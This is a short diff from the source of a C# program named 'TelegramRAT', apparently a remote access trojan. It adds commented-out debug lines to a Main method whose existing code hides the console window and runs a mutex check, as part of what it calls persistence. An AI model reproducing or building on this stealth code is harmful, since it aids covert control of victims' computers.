@@ -16,6 +16,8 @@ namespace TelegramRAT
         [STAThreadAttribute]
         static void Main(string[] args)
         {
+            //Console.ReadLine();
+            //Environment.Exit(1);
             // Hide console
             persistence.HideConsoleWindow();
             // Mutex check
